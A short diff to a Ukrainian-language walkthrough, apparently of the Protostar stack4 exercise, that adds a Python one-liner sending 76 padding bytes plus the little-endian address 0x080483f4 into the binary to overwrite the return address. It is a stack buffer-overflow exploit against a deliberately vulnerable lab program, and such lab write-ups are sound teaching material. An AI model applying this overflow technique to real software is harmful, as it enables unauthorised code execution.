@@ -34,5 +34,7 @@ int main(int argc, char **argv)
 ![image](https://user-images.githubusercontent.com/47494881/147489530-8139c2b5-57f3-429e-a737-1a8f64eaed6d.png)
 
 Наша виграшна адреса 0x080483f4. Тепер нам просто потрібно використовувати Python, щоб надрукувати 76 ‘a’, а потім адресу в Little Endian.
-
+```
+python -c "print('a' * 76 + '\xf4\x83\x04\x08')" | ./stack4
+```
 ![image](https://user-images.githubusercontent.com/47494881/147489760-96bbeaac-dd7b-40ff-81b4-fede045a4d20.png)
